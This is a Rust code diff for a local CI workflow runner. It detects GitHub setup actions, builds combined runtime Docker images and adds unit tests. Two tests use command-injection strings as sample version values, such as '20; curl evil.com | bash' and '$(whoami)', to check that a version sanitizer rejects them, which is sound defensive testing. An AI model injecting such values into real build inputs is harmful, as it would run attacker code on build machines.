@@ -22,7 +22,7 @@ use wrkflw_parser::gitlab::{self, parse_pipeline};
 use wrkflw_parser::workflow::{
     self, parse_workflow, ActionInfo, Job, JobContainer, Step, WorkflowDefinition,
 };
-use wrkflw_runtime::container::ContainerRuntime;
+use wrkflw_runtime::container::{ContainerRuntime, COMBINED_IMAGE_PREFIX};
 use wrkflw_runtime::emulation;
 use wrkflw_secrets::{SecretConfig, SecretManager, SecretMasker, SecretSubstitution};
 
@@ -1104,58 +1104,404 @@ fn is_git_sha(git_ref: &str) -> bool {
     git_ref.len() == 40 && git_ref.chars().all(|c| c.is_ascii_hexdigit())
 }
 
-/// Determine the appropriate Docker image for a GitHub action
+/// Determine the appropriate Docker image for a GitHub action.
+///
+/// Setup actions (from the `SETUP_ACTIONS` table) use the act runner base image
+/// so that runtimes installed by the combined image build remain available.
+/// Other well-known actions use exact-match or namespace-prefix matching.
 fn determine_action_image(repository: &str) -> String {
-    // Handle specific well-known actions
+    // Known setup actions run on the base runner image; their runtimes are
+    // installed via resolve_runner_image's combined image build.
+    if SETUP_ACTIONS.iter().any(|d| d.repos.contains(&repository)) {
+        return "catthehacker/ubuntu:act-latest".to_string();
+    }
+
     match repository {
-        // PHP setup actions
-        repo if repo.starts_with("shivammathur/setup-php") => {
-            "composer:latest".to_string() // Use composer image which includes PHP and composer
-        }
-
-        // Python setup actions
-        repo if repo.starts_with("actions/setup-python") => "python:3.11-slim".to_string(),
-
-        // Node.js setup actions
-        repo if repo.starts_with("actions/setup-node") => "node:20-slim".to_string(),
-
-        // Java setup actions
-        repo if repo.starts_with("actions/setup-java") => "eclipse-temurin:17-jdk".to_string(),
-
-        // Go setup actions
-        repo if repo.starts_with("actions/setup-go") => "golang:1.21-slim".to_string(),
-
-        // .NET setup actions
-        repo if repo.starts_with("actions/setup-dotnet") => {
-            "mcr.microsoft.com/dotnet/sdk:7.0".to_string()
-        }
-
-        // Rust setup actions
-        repo if repo.starts_with("actions-rs/toolchain")
-            || repo.starts_with("dtolnay/rust-toolchain") =>
-        {
-            "rust:latest".to_string()
-        }
-
-        // Docker/container actions
+        // Docker/container actions (namespace prefix)
         repo if repo.starts_with("docker/") => "docker:latest".to_string(),
 
-        // AWS actions
+        // AWS actions (namespace prefix)
         repo if repo.starts_with("aws-actions/") => "amazon/aws-cli:latest".to_string(),
 
-        // Default to Node.js for most GitHub actions (checkout, upload-artifact, etc.)
-        _ => {
-            // Check if it's a common core GitHub action that should use a more complete environment
-            if repository.starts_with("actions/checkout")
-                || repository.starts_with("actions/upload-artifact")
-                || repository.starts_with("actions/download-artifact")
-                || repository.starts_with("actions/cache")
-            {
-                "catthehacker/ubuntu:act-latest".to_string() // Use act runner image for core actions
-            } else {
-                "node:20-slim".to_string() // Default for other actions
-            }
+        // Core GitHub actions that need a full environment
+        "actions/checkout"
+        | "actions/upload-artifact"
+        | "actions/download-artifact"
+        | "actions/cache" => "catthehacker/ubuntu:act-latest".to_string(),
+
+        // Default to Node.js for other actions
+        _ => "node:20-slim".to_string(),
+    }
+}
+
+/// A runtime detected from a setup action step (e.g., `actions/setup-node@v3`).
+struct SetupRuntime {
+    /// Language identifier (e.g., "node", "php", "python")
+    language: String,
+    /// Sanitized version string (e.g., "20", "8.2")
+    version: String,
+    /// Shell commands to install this runtime on an Ubuntu base image
+    install_script: String,
+}
+
+/// Definition of a known setup action for runtime detection.
+///
+/// Used by both `detect_setup_runtimes` (to build combined images) and
+/// `determine_action_image` (to select per-step images), keeping the two
+/// in sync automatically.
+struct SetupActionDef {
+    /// Repository names that map to this runtime (exact match, no @version suffix).
+    repos: &'static [&'static str],
+    /// The `with:` key that specifies the version.
+    with_key: &'static str,
+    /// Default version when no `with:` key is provided.
+    default_version: &'static str,
+    /// Language identifier used in install scripts and image tags.
+    language: &'static str,
+    /// If true, fall back to the @ref from the `uses:` field when no `with:` key is set.
+    /// Used by `dtolnay/rust-toolchain` which encodes the toolchain in the ref.
+    version_from_ref: bool,
+}
+
+const SETUP_ACTIONS: &[SetupActionDef] = &[
+    SetupActionDef {
+        repos: &["actions/setup-node"],
+        with_key: "node-version",
+        default_version: "20",
+        language: "node",
+        version_from_ref: false,
+    },
+    SetupActionDef {
+        repos: &["shivammathur/setup-php"],
+        with_key: "php",
+        default_version: "8.2",
+        language: "php",
+        version_from_ref: false,
+    },
+    SetupActionDef {
+        repos: &["actions/setup-python"],
+        with_key: "python-version",
+        default_version: "3.11",
+        language: "python",
+        version_from_ref: false,
+    },
+    SetupActionDef {
+        repos: &["actions/setup-go"],
+        with_key: "go-version",
+        default_version: "1.21",
+        language: "go",
+        version_from_ref: false,
+    },
+    SetupActionDef {
+        repos: &["actions/setup-java"],
+        with_key: "java-version",
+        default_version: "17",
+        language: "java",
+        version_from_ref: false,
+    },
+    SetupActionDef {
+        repos: &["actions/setup-dotnet"],
+        with_key: "dotnet-version",
+        default_version: "7.0",
+        language: "dotnet",
+        version_from_ref: false,
+    },
+    SetupActionDef {
+        repos: &["actions-rs/toolchain", "dtolnay/rust-toolchain"],
+        with_key: "toolchain",
+        default_version: "stable",
+        language: "rust",
+        version_from_ref: true,
+    },
+];
+
+/// Check that a version string contains only safe characters (alphanumeric, dots, hyphens, underscores).
+fn is_safe_version(version: &str) -> bool {
+    !version.is_empty()
+        && version
+            .chars()
+            .all(|c| c.is_alphanumeric() || c == '.' || c == '-' || c == '_')
+}
+
+/// Scan job steps for known setup actions and return the runtimes they configure.
+///
+/// If the same language appears multiple times, only the last occurrence is kept
+/// (matching GitHub Actions behavior where later setup steps override earlier ones).
+fn detect_setup_runtimes(steps: &[Step]) -> Vec<SetupRuntime> {
+    let mut runtimes: Vec<SetupRuntime> = Vec::new();
+
+    for step in steps {
+        let uses = match &step.uses {
+            Some(u) => u,
+            None => continue,
+        };
+
+        // Split "actions/setup-node@v3" into ("actions/setup-node", Some("v3"))
+        let (repo, git_ref) = match uses.split_once('@') {
+            Some((r, v)) => (r, Some(v)),
+            None => (uses.as_str(), None),
+        };
+
+        let def = match SETUP_ACTIONS.iter().find(|d| d.repos.contains(&repo)) {
+            Some(d) => d,
+            None => continue,
+        };
+
+        let with = step.with.as_ref();
+        let ver = with
+            .and_then(|w| w.get(def.with_key))
+            .cloned()
+            .or_else(|| {
+                // Some actions encode the version in the @ref (e.g., dtolnay/rust-toolchain@nightly).
+                // Skip bare git SHAs — they pin the action version, not the toolchain.
+                if def.version_from_ref {
+                    git_ref.filter(|r| !is_git_sha(r)).map(|r| r.to_string())
+                } else {
+                    None
+                }
+            })
+            .unwrap_or_else(|| def.default_version.to_string());
+
+        // Normalize trailing ".x" suffix (e.g., "16.x" -> "16") so it doesn't
+        // leak into install scripts for languages that don't expect it.
+        let ver = if ver.ends_with(".x") {
+            ver[..ver.len() - 2].to_string()
+        } else {
+            ver
+        };
+
+        if !is_safe_version(&ver) {
+            wrkflw_logging::warning(&format!(
+                "Ignoring {} with invalid version: {:?}",
+                def.language, ver
+            ));
+            continue;
         }
+
+        let rt = SetupRuntime {
+            language: def.language.to_string(),
+            version: ver.clone(),
+            install_script: get_install_script(def.language, &ver),
+        };
+
+        // Deduplicate: later setup steps override earlier ones for the same language
+        let existing_idx = runtimes.iter().position(|r| r.language == rt.language);
+        if let Some(idx) = existing_idx {
+            runtimes[idx] = rt;
+        } else {
+            runtimes.push(rt);
+        }
+    }
+
+    runtimes
+}
+
+/// Return shell commands that install a language runtime on an Ubuntu base image.
+fn get_install_script(language: &str, version: &str) -> String {
+    match language {
+        "node" => {
+            // Strip .x suffix for nodesource URL (e.g., "16.x" -> "16")
+            let major = version.split('.').next().unwrap_or(version);
+            format!(
+                "curl -fsSL https://deb.nodesource.com/setup_{}.x | bash - && apt-get install -y nodejs",
+                major
+            )
+        }
+        "php" => {
+            format!(
+                "apt-get install -y software-properties-common && \
+                 add-apt-repository -y ppa:ondrej/php && apt-get update && \
+                 apt-get install -y php{ver}-cli php{ver}-mbstring php{ver}-xml php{ver}-curl unzip && \
+                 curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer",
+                ver = version
+            )
+        }
+        "python" => {
+            format!(
+                "apt-get install -y software-properties-common && \
+                 add-apt-repository -y ppa:deadsnakes/ppa && apt-get update && \
+                 apt-get install -y python{ver} python{ver}-venv && \
+                 ln -sf /usr/bin/python{ver} /usr/bin/python && \
+                 ln -sf /usr/bin/python{ver} /usr/bin/python3 && \
+                 curl -sS https://bootstrap.pypa.io/get-pip.py | python{ver}",
+                ver = version
+            )
+        }
+        "go" => {
+            format!(
+                "ARCH=$(dpkg --print-architecture || echo amd64) && \
+                 curl -fsSL https://go.dev/dl/go{}.linux-${{ARCH}}.tar.gz | tar -C /usr/local -xz && \
+                 ln -s /usr/local/go/bin/go /usr/bin/go",
+                version
+            )
+        }
+        "java" => {
+            format!(
+                "apt-get install -y wget apt-transport-https gpg && \
+                 wget -qO - https://packages.adoptium.net/artifactory/api/gpg/key/public | gpg --dearmor -o /usr/share/keyrings/adoptium.gpg && \
+                 echo 'deb [signed-by=/usr/share/keyrings/adoptium.gpg] https://packages.adoptium.net/artifactory/deb $(cat /etc/os-release | grep UBUNTU_CODENAME | cut -d= -f2) main' > /etc/apt/sources.list.d/adoptium.list && \
+                 apt-get update && apt-get install -y temurin-{}-jdk",
+                version
+            )
+        }
+        "dotnet" => {
+            format!(
+                "apt-get install -y wget && \
+                 wget https://dot.net/v1/dotnet-install.sh -O /tmp/dotnet-install.sh && \
+                 chmod +x /tmp/dotnet-install.sh && \
+                 /tmp/dotnet-install.sh --channel {} --install-dir /usr/share/dotnet && \
+                 ln -s /usr/share/dotnet/dotnet /usr/bin/dotnet",
+                version
+            )
+        }
+        "rust" => {
+            format!(
+                "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain {} && \
+                 . $HOME/.cargo/env && \
+                 ln -s $HOME/.cargo/bin/* /usr/local/bin/",
+                version
+            )
+        }
+        _ => String::new(),
+    }
+}
+
+/// Generate a Dockerfile that installs multiple language runtimes on an Ubuntu base.
+///
+/// Extracted as a pure function so the output can be unit-tested without Docker.
+fn generate_combined_dockerfile(runtimes: &[SetupRuntime], base_image: &str) -> String {
+    let mut dockerfile = format!("FROM {}\n", base_image);
+
+    // Combine base packages and all runtime install scripts into a single
+    // RUN directive so there is only one `apt-get update` call and the Docker
+    // layer cache works as a single unit.
+    let scripts: Vec<&str> = runtimes
+        .iter()
+        .filter(|rt| !rt.install_script.is_empty())
+        .map(|rt| rt.install_script.as_str())
+        .collect();
+
+    dockerfile.push_str("RUN apt-get update && \\\n");
+    dockerfile.push_str(
+        "    apt-get install -y --no-install-recommends curl bash git ca-certificates gnupg",
+    );
+
+    for script in &scripts {
+        dockerfile.push_str(" && \\\n");
+        dockerfile.push_str(&format!("    {}", script));
+    }
+
+    dockerfile.push_str(" && \\\n    rm -rf /var/lib/apt/lists/*\n");
+
+    dockerfile
+}
+
+/// FNV-1a hash — deterministic across Rust toolchain versions, unlike `DefaultHasher`.
+fn fnv1a_hash(data: &[u8]) -> u64 {
+    const FNV_OFFSET_BASIS: u64 = 14695981039346656037;
+    const FNV_PRIME: u64 = 1099511628211;
+    let mut hash = FNV_OFFSET_BASIS;
+    for &byte in data {
+        hash ^= byte as u64;
+        hash = hash.wrapping_mul(FNV_PRIME);
+    }
+    hash
+}
+
+/// Build a deterministic image tag from the Dockerfile content.
+///
+/// Includes a hash of the full Dockerfile so that changes to install scripts
+/// (e.g., updated URLs) invalidate the cache even when language/version pairs
+/// are unchanged.  Uses FNV-1a rather than `DefaultHasher` so the tag is
+/// stable across Rust toolchain upgrades.
+fn combined_image_tag(runtimes: &[SetupRuntime], dockerfile: &str) -> String {
+    let mut tag_parts: Vec<String> = runtimes
+        .iter()
+        .map(|r| format!("{}{}", r.language, r.version))
+        .collect();
+    tag_parts.sort();
+
+    let hash = fnv1a_hash(dockerfile.as_bytes());
+
+    format!(
+        "{}{}-{:x}",
+        COMBINED_IMAGE_PREFIX,
+        tag_parts.join("-"),
+        hash
+    )
+}
+
+/// Build a Docker image that combines multiple language runtimes on an Ubuntu base.
+///
+/// Skips the build when an image with the same tag already exists locally,
+/// avoiding redundant work on repeated runs.
+async fn build_combined_runtime_image(
+    runtimes: &[SetupRuntime],
+    base_image: &str,
+    runtime: &dyn ContainerRuntime,
+) -> Result<String, ExecutionError> {
+    let dockerfile = generate_combined_dockerfile(runtimes, base_image);
+    let tag = combined_image_tag(runtimes, &dockerfile);
+
+    // Skip the build if the image already exists locally.
+    let exists = runtime.image_exists(&tag).await.map_err(|e| {
+        ExecutionError::Runtime(format!("Failed to check for existing image: {}", e))
+    })?;
+    if exists {
+        wrkflw_logging::info(&format!("Reusing existing combined runtime image: {}", tag));
+        return Ok(tag);
+    }
+
+    let temp_dir = tempfile::tempdir().map_err(|e| {
+        ExecutionError::Execution(format!("Failed to create temp directory: {}", e))
+    })?;
+
+    let dockerfile_path = temp_dir.path().join("Dockerfile");
+    std::fs::write(&dockerfile_path, &dockerfile)
+        .map_err(|e| ExecutionError::Execution(format!("Failed to write Dockerfile: {}", e)))?;
+
+    wrkflw_logging::info(&format!(
+        "Building combined runtime image with: {}",
+        runtimes
+            .iter()
+            .map(|r| r.language.as_str())
+            .collect::<Vec<_>>()
+            .join(", ")
+    ));
+
+    runtime
+        .build_image(&dockerfile_path, &tag, temp_dir.path())
+        .await
+        .map_err(|e| {
+            ExecutionError::Runtime(format!("Failed to build combined runtime image: {}", e))
+        })?;
+
+    Ok(tag)
+}
+
+/// Determine the effective runner image for a job, taking setup actions into account.
+///
+/// If the job has an explicit `container:` config, that takes precedence.
+/// Otherwise, scans steps for setup actions and builds a combined image that
+/// installs the detected runtimes on top of the runner base image (which
+/// includes git and other tools needed by actions like `actions/checkout`).
+async fn resolve_runner_image(
+    job: &Job,
+    runtime: &dyn ContainerRuntime,
+) -> Result<String, ExecutionError> {
+    let base_image = get_effective_runner_image(job);
+
+    if job.container.is_some() {
+        return Ok(base_image);
+    }
+
+    let setup_runtimes = detect_setup_runtimes(&job.steps);
+    if setup_runtimes.is_empty() {
+        Ok(base_image)
+    } else {
+        // Always build a combined image on the runner base so that essential
+        // tools (git, curl, etc.) remain available for actions like checkout.
+        build_combined_runtime_image(&setup_runtimes, &base_image, runtime).await
     }
 }
 
@@ -1344,8 +1690,8 @@ async fn execute_job(ctx: JobExecutionContext<'_>) -> Result<JobResult, Executio
     let mut job_success = true;
 
     // Execute job steps
-    // Determine runner image: prefer job container image, fall back to runs-on mapping
-    let runner_image_value = get_effective_runner_image(job);
+    // Determine runner image: prefer job container, then detect setup actions, fall back to runs-on
+    let runner_image_value = resolve_runner_image(job, ctx.runtime).await?;
 
     for (idx, step) in job.steps.iter().enumerate() {
         let outcome = run_step_with_guards(
@@ -1543,8 +1889,8 @@ async fn execute_matrix_job(
         true
     } else {
         // Execute each step
-        // Determine runner image: prefer job container image, fall back to runs-on mapping
-        let runner_image_value = get_effective_runner_image(job_template);
+        // Determine runner image: prefer job container, then detect setup actions, fall back to runs-on
+        let runner_image_value = resolve_runner_image(job_template, runtime).await?;
 
         let mut all_steps_ok = true;
         for (idx, step) in job_template.steps.iter().enumerate() {
@@ -4311,6 +4657,10 @@ runs:
         ) -> Result<String, ContainerError> {
             Ok("mock-image:latest".to_string())
         }
+
+        async fn image_exists(&self, _tag: &str) -> Result<bool, ContainerError> {
+            Ok(false)
+        }
     }
 
     /// Helper to build a minimal `WorkflowDefinition`.
@@ -4683,5 +5033,456 @@ runs:
     #[test]
     fn sub_path_rejects_mixed_separator_dotdot() {
         assert!(sanitize_sub_path("a/..\\..\\etc").is_err());
+    }
+
+    // --- detect_setup_runtimes tests ---
+
+    fn make_step_uses(uses: &str, with: Option<HashMap<String, String>>) -> Step {
+        Step {
+            name: None,
+            uses: Some(uses.to_string()),
+            run: None,
+            with,
+            env: HashMap::new(),
+            continue_on_error: None,
+            if_condition: None,
+            id: None,
+            working_directory: None,
+            shell: None,
+            timeout_minutes: None,
+        }
+    }
+
+    fn make_step_run(run: &str) -> Step {
+        Step {
+            name: None,
+            uses: None,
+            run: Some(run.to_string()),
+            with: None,
+            env: HashMap::new(),
+            continue_on_error: None,
+            if_condition: None,
+            id: None,
+            working_directory: None,
+            shell: None,
+            timeout_minutes: None,
+        }
+    }
+
+    #[test]
+    fn detect_setup_runtimes_empty_steps() {
+        let runtimes = detect_setup_runtimes(&[]);
+        assert!(runtimes.is_empty());
+    }
+
+    #[test]
+    fn detect_setup_runtimes_no_setup_actions() {
+        let steps = vec![
+            make_step_uses("actions/checkout@v4", None),
+            make_step_uses("actions/cache@v3", None),
+            make_step_run("echo hello"),
+        ];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert!(runtimes.is_empty());
+    }
+
+    #[test]
+    fn detect_setup_runtimes_single_node() {
+        let steps = vec![
+            make_step_uses("actions/checkout@v4", None),
+            make_step_uses("actions/setup-node@v3", None),
+            make_step_run("npm install"),
+        ];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "node");
+        assert_eq!(runtimes[0].version, "20");
+        assert!(!runtimes[0].install_script.is_empty());
+    }
+
+    #[test]
+    fn detect_setup_runtimes_node_with_version() {
+        let with = HashMap::from([("node-version".to_string(), "16.x".to_string())]);
+        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "node");
+        // ".x" suffix is normalized away
+        assert_eq!(runtimes[0].version, "16");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_php() {
+        let with = HashMap::from([("php".to_string(), "8.1".to_string())]);
+        let steps = vec![make_step_uses("shivammathur/setup-php@v2", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "php");
+        assert_eq!(runtimes[0].version, "8.1");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_multi_language() {
+        let steps = vec![
+            make_step_uses("actions/checkout@v4", None),
+            make_step_uses("shivammathur/setup-php@v2", None),
+            make_step_uses("actions/setup-node@v4", None),
+            make_step_run("composer install"),
+            make_step_run("npm install"),
+        ];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 2);
+        assert_eq!(runtimes[0].language, "php");
+        assert_eq!(runtimes[1].language, "node");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_python_with_version() {
+        let with = HashMap::from([("python-version".to_string(), "3.12".to_string())]);
+        let steps = vec![make_step_uses("actions/setup-python@v5", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "python");
+        assert_eq!(runtimes[0].version, "3.12");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_go() {
+        let with = HashMap::from([("go-version".to_string(), "1.22".to_string())]);
+        let steps = vec![make_step_uses("actions/setup-go@v5", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "go");
+        assert_eq!(runtimes[0].version, "1.22");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_rust() {
+        let steps = vec![make_step_uses("dtolnay/rust-toolchain@stable", None)];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "rust");
+        assert_eq!(runtimes[0].version, "stable");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_rust_version_from_ref() {
+        // dtolnay/rust-toolchain encodes the toolchain in the @ref
+        let steps = vec![make_step_uses("dtolnay/rust-toolchain@nightly", None)];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "rust");
+        assert_eq!(runtimes[0].version, "nightly");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_rust_with_overrides_ref() {
+        // Explicit with.toolchain takes precedence over @ref
+        let with = HashMap::from([("toolchain".to_string(), "beta".to_string())]);
+        let steps = vec![make_step_uses("dtolnay/rust-toolchain@nightly", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].version, "beta");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_rust_sha_ref_falls_back_to_default() {
+        // A pinned SHA ref should NOT be treated as a toolchain version
+        let steps = vec![make_step_uses(
+            "dtolnay/rust-toolchain@d4ff7a3c5bbbc35c47ee72003c3e0a88e24a9919",
+            None,
+        )];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "rust");
+        assert_eq!(runtimes[0].version, "stable");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_normalizes_dot_x_suffix() {
+        // "16.x" should be normalized to "16"
+        let with = HashMap::from([("node-version".to_string(), "16.x".to_string())]);
+        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].version, "16");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_java() {
+        let with = HashMap::from([("java-version".to_string(), "21".to_string())]);
+        let steps = vec![make_step_uses("actions/setup-java@v4", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "java");
+        assert_eq!(runtimes[0].version, "21");
+    }
+
+    #[test]
+    fn detect_setup_runtimes_dotnet() {
+        let with = HashMap::from([("dotnet-version".to_string(), "8.0".to_string())]);
+        let steps = vec![make_step_uses("actions/setup-dotnet@v4", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "dotnet");
+        assert_eq!(runtimes[0].version, "8.0");
+    }
+
+    #[test]
+    fn get_install_script_returns_nonempty_for_known_languages() {
+        for lang in &["node", "php", "python", "go", "java", "dotnet", "rust"] {
+            let script = get_install_script(lang, "latest");
+            assert!(
+                !script.is_empty(),
+                "install script for {} should not be empty",
+                lang
+            );
+        }
+    }
+
+    #[test]
+    fn get_install_script_returns_empty_for_unknown() {
+        assert!(get_install_script("unknown_lang", "1.0").is_empty());
+    }
+
+    // --- version sanitization tests ---
+
+    #[test]
+    fn is_safe_version_accepts_valid() {
+        assert!(is_safe_version("20"));
+        assert!(is_safe_version("3.12"));
+        assert!(is_safe_version("16.x"));
+        assert!(is_safe_version("8.2-rc1"));
+        assert!(is_safe_version("stable"));
+        assert!(is_safe_version("1.21_beta"));
+    }
+
+    #[test]
+    fn is_safe_version_rejects_injection() {
+        assert!(!is_safe_version(""));
+        assert!(!is_safe_version("20; curl evil.com | bash"));
+        assert!(!is_safe_version("20\nRUN malicious"));
+        assert!(!is_safe_version("20 && echo pwned"));
+        assert!(!is_safe_version("$(whoami)"));
+        assert!(!is_safe_version("20`id`"));
+    }
+
+    #[test]
+    fn detect_setup_runtimes_skips_invalid_version() {
+        let with = HashMap::from([(
+            "node-version".to_string(),
+            "20; curl evil.com | bash".to_string(),
+        )]);
+        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert!(runtimes.is_empty());
+    }
+
+    // --- deduplication tests ---
+
+    #[test]
+    fn detect_setup_runtimes_deduplicates_same_language() {
+        let with_16 = HashMap::from([("node-version".to_string(), "16".to_string())]);
+        let with_20 = HashMap::from([("node-version".to_string(), "20".to_string())]);
+        let steps = vec![
+            make_step_uses("actions/setup-node@v3", Some(with_16)),
+            make_step_uses("actions/setup-node@v4", Some(with_20)),
+        ];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        // Last one wins
+        assert_eq!(runtimes[0].version, "20");
+    }
+
+    // --- exact match tests ---
+
+    #[test]
+    fn detect_setup_runtimes_ignores_similar_action_names() {
+        let steps = vec![
+            make_step_uses("actions/setup-node-legacy@v1", None),
+            make_step_uses("actions/setup-nodejs@v1", None),
+        ];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert!(runtimes.is_empty());
+    }
+
+    // --- determine_action_image exact-match tests ---
+
+    #[test]
+    fn determine_action_image_exact_match_setup_actions() {
+        // Known setup actions should return the runner base
+        assert_eq!(
+            determine_action_image("actions/setup-node"),
+            "catthehacker/ubuntu:act-latest"
+        );
+        assert_eq!(
+            determine_action_image("actions/setup-python"),
+            "catthehacker/ubuntu:act-latest"
+        );
+        assert_eq!(
+            determine_action_image("shivammathur/setup-php"),
+            "catthehacker/ubuntu:act-latest"
+        );
+        assert_eq!(
+            determine_action_image("dtolnay/rust-toolchain"),
+            "catthehacker/ubuntu:act-latest"
+        );
+    }
+
+    #[test]
+    fn determine_action_image_rejects_similar_names() {
+        // Similar-but-different action names must NOT match setup actions
+        assert_eq!(
+            determine_action_image("actions/setup-node-legacy"),
+            "node:20-slim"
+        );
+        assert_eq!(
+            determine_action_image("actions/setup-nodejs"),
+            "node:20-slim"
+        );
+    }
+
+    #[test]
+    fn determine_action_image_core_actions() {
+        assert_eq!(
+            determine_action_image("actions/checkout"),
+            "catthehacker/ubuntu:act-latest"
+        );
+        assert_eq!(
+            determine_action_image("actions/cache"),
+            "catthehacker/ubuntu:act-latest"
+        );
+    }
+
+    #[test]
+    fn determine_action_image_namespace_prefix() {
+        // docker/* and aws-actions/* use namespace prefix matching
+        assert_eq!(
+            determine_action_image("docker/build-push-action"),
+            "docker:latest"
+        );
+        assert_eq!(
+            determine_action_image("docker/login-action"),
+            "docker:latest"
+        );
+        assert_eq!(
+            determine_action_image("aws-actions/configure-aws-credentials"),
+            "amazon/aws-cli:latest"
+        );
+    }
+
+    // --- Dockerfile generation tests ---
+
+    #[test]
+    fn generate_combined_dockerfile_single_runtime() {
+        let runtimes = vec![SetupRuntime {
+            language: "node".to_string(),
+            version: "20".to_string(),
+            install_script: get_install_script("node", "20"),
+        }];
+        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
+        assert!(df.starts_with("FROM ubuntu:latest\n"));
+        assert!(df.contains("nodesource"));
+        // Everything in a single RUN layer
+        assert_eq!(df.matches("RUN ").count(), 1);
+    }
+
+    #[test]
+    fn generate_combined_dockerfile_multi_runtime_single_run() {
+        let runtimes = vec![
+            SetupRuntime {
+                language: "node".to_string(),
+                version: "20".to_string(),
+                install_script: get_install_script("node", "20"),
+            },
+            SetupRuntime {
+                language: "python".to_string(),
+                version: "3.12".to_string(),
+                install_script: get_install_script("python", "3.12"),
+            },
+        ];
+        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
+        // Everything in a single RUN layer
+        assert_eq!(df.matches("RUN ").count(), 1);
+        assert!(df.contains("nodesource"));
+        assert!(df.contains("deadsnakes"));
+    }
+
+    #[test]
+    fn generate_combined_dockerfile_skips_empty_scripts() {
+        let runtimes = vec![SetupRuntime {
+            language: "unknown".to_string(),
+            version: "1.0".to_string(),
+            install_script: String::new(),
+        }];
+        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
+        // Single RUN layer with just the base packages
+        assert_eq!(df.matches("RUN ").count(), 1);
+    }
+
+    #[test]
+    fn combined_image_tag_is_deterministic() {
+        let runtimes = vec![
+            SetupRuntime {
+                language: "node".to_string(),
+                version: "20".to_string(),
+                install_script: "install node".to_string(),
+            },
+            SetupRuntime {
+                language: "python".to_string(),
+                version: "3.12".to_string(),
+                install_script: "install python".to_string(),
+            },
+        ];
+        let df = "FROM base\nRUN install stuff\n";
+        let tag1 = combined_image_tag(&runtimes, df);
+        let tag2 = combined_image_tag(&runtimes, df);
+        assert_eq!(tag1, tag2);
+        assert!(tag1.starts_with(COMBINED_IMAGE_PREFIX));
+    }
+
+    #[test]
+    fn combined_image_tag_changes_when_dockerfile_changes() {
+        let runtimes = vec![SetupRuntime {
+            language: "node".to_string(),
+            version: "20".to_string(),
+            install_script: "install node v1".to_string(),
+        }];
+        let tag1 = combined_image_tag(&runtimes, "FROM base\nRUN v1\n");
+        let tag2 = combined_image_tag(&runtimes, "FROM base\nRUN v2\n");
+        assert_ne!(tag1, tag2);
+    }
+
+    #[test]
+    fn combined_image_tag_sorts_languages() {
+        let runtimes_ab = vec![
+            SetupRuntime {
+                language: "a".to_string(),
+                version: "1".to_string(),
+                install_script: String::new(),
+            },
+            SetupRuntime {
+                language: "b".to_string(),
+                version: "2".to_string(),
+                install_script: String::new(),
+            },
+        ];
+        let runtimes_ba = vec![
+            SetupRuntime {
+                language: "b".to_string(),
+                version: "2".to_string(),
+                install_script: String::new(),
+            },
+            SetupRuntime {
+                language: "a".to_string(),
+                version: "1".to_string(),
+                install_script: String::new(),
+            },
+        ];
+        let df = "same";
+        let tag_ab = combined_image_tag(&runtimes_ab, df);
+        let tag_ba = combined_image_tag(&runtimes_ba, df);
+        // Both should produce the same sorted prefix (a1-b2)
+        assert_eq!(tag_ab, tag_ba);
     }
 }
